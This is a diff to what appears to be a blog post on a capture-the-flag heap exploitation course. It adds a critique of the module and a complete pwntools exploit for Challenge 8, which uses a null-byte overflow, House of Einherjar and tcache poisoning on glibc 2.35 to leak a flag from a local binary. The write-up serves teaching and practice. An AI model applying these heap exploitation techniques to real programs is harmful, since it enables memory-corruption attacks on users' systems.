@@ -10,7 +10,15 @@ categories: jekyll update
 {:toc}
 ## Overview
 
-All of the challenges were based on `libc-2.35`, which is pretty modern. 
+This module deals with glibc exploitation past tcache: `fastbins, unsortedbins, smallbins, largebins, mmap chunks`. All challenges are based on `libc-2.35`, which is pretty modern. First 3 challenges involves basic heap shaping technqiues, while the rest of the challenges are all based on POCs from Shellphis How2Heap repo. \
+This module contains relatively advanced content, yet is mandatory for modern exploitation. Its main advantage is the opportunity of learning new, sometimes obscure, modern heap exploitation techniques. \
+In my opinion, there are 2 problems with this module:
+
+1. While there were literally 30 different challenges solely involving the tcache bins (which is great), there are only 8 challenges for all other bins. I'd expect this module's size to be at least of the same size as the tcache's. 
+
+2. Disregard of data-plane exploitation. All learned techniques and challenges were intended for control-plane exploitation, hence - overwriting some control metadata of the glibc allocator. The teached methodology is abit naive: "understand the primitives, scan How2Heap, get the flag". While this may work for CTFs, most real world exploits don't work this way. Most of the time we'd exploit the behavior of the program itself (For example, corruption of a function pointer within one of the program's defined structs), not going through wrecking the heap itself (at least in a too severe manner, such as techniques that literally involves **FAKE A WHOLE ARENA**). 
+
+I do think this module is good and worth doing. Just keep in mind that it's just a small taste of how advanced heap exploitation really looks like. 
 
 ## Background
 
@@ -647,9 +655,108 @@ def exploit():
 ## Challenge 8
 
 This time we can perform allocations of up to `0x1000` bytes, using `malloc`. Moreover, unlike before, now the `free` handler nullifies a pointer's slot and its corresponding size slot, hence closes the UAF vuln. If that's not enough, `puts` performs a check according to `malloc_usable_size`, asserting it contains some legitimate value, before printing the chunk's content. \
-`read_flag` dynamically allocates a large chunk ox size `0x56e`, and reads the flag there. If we can manage to tweak this allocation / perform double free, such that the returned address would be an-already-used address, we can pwn this. The new vuln resides within `read_copy`, which copies chunk's content to global `strcpy_scratch` within the `.bss` (based on the chunk's requested size), and reads that content into the chunk. Then, it sets a single null byte right past the end of the chunk. This means the vuln we have is a single null byte overflow. 
+`read_flag` dynamically allocates a large chunk ox size `0x56e`, and reads the flag there. If we can manage to tweak this allocation or perform double free, such that the returned address would be an-already-used address, we can pwn this. The new vuln resides within `read_copy`, which copies chunk's content to global `strcpy_scratch` within the `.bss` (based on the chunk's requested size), and reads that content into the chunk. Then, it sets a single null byte right past the end of the chunk. This means the vuln we have is a single null byte overflow, hence, we have 2 options - poision null byte, or House of Einherjar. I find the second exploit abit easier, so I've implemented it. \
+The idea behind this House is simple - using the single null byte overflow, clear the `PREV_INUSE` bit of some chunk. In particular, we'd overwrite chunk size of `0x101` to `0x100`. By doing so, upon a free, we would be able to consolidate that overwritten chunk with a fake chunk, thus obtaining linear heap overflow primitive, starting from a fake chunk. \
+Having linear heap overflow, we can easily perform tcache-poisioning, having arbitrary-alloc primitive. My original plan in order to leak the flag, was to load the flag into memory, trigger tcache-poision to land right on that chunk, and read it. However, recall that the tcache-poision allocation nullifies the `key` (2nd qword), hence truncates the output. A very cool trick we can do, is to first allocate via tcache-poision at a predicted address, then load the flag, then read the tcache chunk. 
+
+```python
+def exploit(p, a_addr, a_size, b_size, c_size, heap_key, addr, value = b'', debug=False):
+    # Allocate a, will contain fake chunk
+    a_index = 0
+    malloc(p, a_index, a_size) 
+    
+    # Create fake chunk
+    fake_size = a_size + b_size
+
+    buf = p64(0)  # prev_size
+    buf += p64(fake_size)  # size
+    buf += p64(a_addr)
+    buf += p64(a_addr)
+    read_copy(p, a_index, buf)
+
+    # Allocate b, chunk that will overflow with a single null byte into c's metadata
+    b_index = 1
+    c_index = 2
+    malloc(p, b_index, b_size)  # b, overflowing
+    malloc(p, c_index, c_size)  # c, victim
+
+    # Trigger vuln, which only clears PREV_INUSE of c
+    buf = b'A' * (b_size - 8)
+    buf += p64(fake_size)  # set c's prev_size
+    read_copy(p, b_index, buf)
+
+    # Fill tcache
+    for i in range(3, 10):
+        malloc(p, i, c_size)
+    for i in range(3, 10):
+        free(p, i)
+    
+    # free chunk c to consolidate with the fake chunk, now stored within the unsortedbin
+    free(p, c_index)
+
+    # Call malloc, and it will begin with our fake chunk!
+    d_index = 3
+    d_size = c_size + fake_size
+    malloc(p, d_index, d_size)
+
+    # First fill b's tcachebin
+    malloc(p, 15, b_size)
+    free(p, 15)
+    # Now perform fastbin poisioning, using the fake chunk - we can overwrite next. 
+    # Now b's next is initialized to some crap
+    free(p, b_index)
+
+    # We want to allocate a new chunk right on the alloc_struct array, overwrite next ptr
+    buf_2 = b'B' * 0x20
+    buf_2 += p64(0)  # prev_size of tcache
+    buf_2 += p64(b_size + 0x8 + 1)  # save the same size
+    buf_2 += p64((addr) ^ heap_key)[:-1]  # We dont want 8 bytes, as we would overwrite key. Moreover, last is always 0 anyways
+    read_copy(p, d_index, buf_2)
+
+    malloc(p, b_index, b_size)   
+    # Very cool trick. First allocate via tcache-poision at predicted address, THEN load the flag!
+    malloc(p, 15, b_size)
+
+    read_flag(p)
+
+    flag = puts_addr(p, 15)
+    log.info(f'flag: {flag}')
 
 
+def main():    
+    debug = False
+    if debug:
+        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
+    else:
+        p = process(BINARY)
+    
+    # Stage 1 - leak heap address. Create 2-chunks within tcache
+    tcache_size = 0x10
+    malloc(p, 0, tcache_size)
+    malloc(p, 1, tcache_size)
+    free(p, 1)
+    free(p, 0)
+    malloc(p, 0, tcache_size)
+    malloc(p, 1, tcache_size)
+
+    # Leak safe-linking next ptr (without any vuln)
+    flag_offset = 0xba0
+    mangled_next_ptr = puts_addr(p, 0)
+    mangled_next_ptr = u64(mangled_next_ptr.ljust(8, b'\x00'))
+    log.info(f'mangled_next_ptr: {hex(mangled_next_ptr)}')
+    next_ptr, heap_key = demangle_ptr(mangled_next_ptr)
+    heap_base = next_ptr & (~0xfff)
+    flag_addr = heap_base + flag_offset
+    log.info(f'flag_addr: {hex(flag_addr)} heap_base: {hex(heap_base)} next_ptr: {hex(next_ptr)} heap_key: {(hex(heap_key))}')
+    
+    # Contains the second half of the flag
+    tcachebin_addr = heap_base + 0xa0
+
+    b_size = 0x38
+    new_flag_header = p64(0)
+    new_flag_header += p64(b_size + 8 + 1)[:-1]
+    exploit(p, next_ptr + 0x20 ,0x38, b_size, 0xf8, heap_key, flag_addr, value=new_flag_header)
+```
 
 
 [shellphish]: https://github.com/shellphish/how2heap
